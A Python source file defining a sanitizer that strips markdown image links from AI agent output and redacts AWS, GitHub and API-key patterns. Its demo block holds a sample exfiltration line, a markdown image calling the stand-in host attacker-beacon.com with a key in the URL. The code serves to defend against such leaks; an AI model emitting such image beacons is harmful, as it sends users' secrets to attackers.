import re
from typing import Tuple, List

class DataExfiltrationShield:
    """Sanitizes outgoing agent text to neutralize markdown image beacons and credential leaks."""

    # Matches markdown images: ![alt](url)
    IMAGE_BEACON_REGEX = re.compile(r"!\[(.*?)\]\((https?:\/\/[^\s\)]+)\)")
    
    # Matches common cloud credentials
    SECRET_PATTERNS = [
        re.compile(r"AKIA[0-9A-Z]{16}"),               # AWS Access Key ID
        re.compile(r"ghp_[A-Za-z0-9_]{36}"),            # GitHub Personal Access Token
        re.compile(r"sk-[A-Za-z0-9]{32,48}")            # OpenAI / API Secret Keys
    ]

    @classmethod
    def sanitize_outbound_text(cls, raw_text: str) -> Tuple[str, List[str]]:
        alerts = []
        
        # 1. Neutralize Markdown Image Exfiltration Beacons
        def replace_image(match):
            alt_text = match.group(1)
            url = match.group(2)
            alerts.append(f"STRIPPED_MARKDOWN_IMAGE_BEACON: {url}")
            return f"[BLOCKED_IMAGE: {alt_text}]"
            
        sanitized = cls.IMAGE_BEACON_REGEX.sub(replace_image, raw_text)
        
        # 2. Redact Exposed API Keys
        for pattern in cls.SECRET_PATTERNS:
            if pattern.search(sanitized):
                alerts.append("CREDENTIAL_LEAK_DETECTED")
                sanitized = pattern.sub("[REDACTED_CREDENTIAL]", sanitized)
                
        return sanitized, alerts

if __name__ == "__main__":
    malicious_output = (
        "Here is the system report.\n"
        "![Telemetry Chart](https://attacker-beacon.com/collect?token=AKIAIOSFODNN7EXAMPLE)\n"
        "Status is optimal."
    )
    
    clean_text, alerts_triggered = DataExfiltrationShield.sanitize_outbound_text(malicious_output)
    print("Sanitized Output:\n", clean_text)
    print("Triggered Alerts:", alerts_triggered)
